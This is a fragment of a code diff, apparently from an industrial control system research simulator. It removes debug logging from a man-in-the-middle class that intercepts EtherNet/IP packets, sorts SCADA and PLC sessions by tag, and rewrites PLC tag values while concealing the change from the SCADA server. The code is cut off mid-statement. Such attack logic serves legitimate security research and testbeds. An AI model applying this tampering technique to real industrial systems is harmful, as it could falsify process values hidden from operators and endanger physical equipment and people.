@@ -38,26 +38,17 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                 if len(p) == 116:
                     this_session =  int.from_bytes(p[Raw].load[4:8], sys.byteorder)
                     tag_name = p[Raw].load.decode(encoding='latin-1')[54:56]
-                    self.logger.debug('ENIP TCP Session ID: ' + str(this_session))
-                    self.logger.debug('Received tag is: ' + tag_name)
-                    self.logger.debug('Attack tag is: ' + self.attacked_tag)
                     if self.attacked_tag == tag_name:
                         # This is a packet being sent to SCADA server, conceal the manipulation
-                        self.logger.debug('Packet source: ' + p[IP].src )
-                        self.logger.debug('SCADA IP: ' + self.intermediate_yaml['scada']['public_ip'])
                         if p[IP].src == self.intermediate_yaml['scada']['public_ip']:
-                            self.logger.debug('SCADA session: ' + str(this_session))
                             self.scada_session_ids.append(this_session)
                         else:
-                            self.logger.debug('PLC session: ' + str(this_session))
                             self.attack_session_ids.append(this_session)
 
                 if len(p) == 102:
                     this_session = int.from_bytes(p[Raw].load[4:8], sys.byteorder)
                     if this_session in self.attack_session_ids:
-                        self.logger.debug('Modifying because session is: ' + str(this_session))
                         value = translate_payload_to_float(p[Raw].load)
-                        self.logger.debug('tag value is:' + str(value))
 
                         if 'value' in self.intermediate_attack.keys():
                             p[Raw].load = translate_float_to_payload(
